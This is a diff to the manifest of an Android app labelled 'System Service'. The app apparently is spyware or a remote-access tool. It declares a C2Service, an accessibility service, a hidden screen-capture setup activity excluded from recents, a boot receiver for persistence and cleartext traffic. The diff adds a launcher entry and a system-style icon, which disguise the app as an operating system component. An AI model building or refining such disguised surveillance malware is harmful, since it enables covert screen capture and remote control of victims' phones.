@@ -24,10 +24,27 @@
 
     <application
         android:allowBackup="true"
+        android:icon="@android:drawable/ic_menu_manage"
         android:label="System Service"
         android:supportsRtl="true"
         android:usesCleartextTraffic="true"
-        android:theme="@android:style/Theme.Translucent.NoTitleBar">
+        android:theme="@android:style/Theme.Material.Light">
+
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:label="System Service">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+
+        <activity
+            android:name=".MediaProjectionSetupActivity"
+            android:excludeFromRecents="true"
+            android:exported="false"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
 
         <service
             android:name=".C2Service"
@@ -45,12 +62,6 @@
                 android:name="android.accessibilityservice"
                 android:resource="@xml/accessibility_config"/>
         </service>
-
-        <activity
-            android:name=".MediaProjectionSetupActivity"
-            android:excludeFromRecents="true"
-            android:exported="false"
-            android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
 
         <receiver android:name=".BootReceiver" android:exported="true">
             <intent-filter>
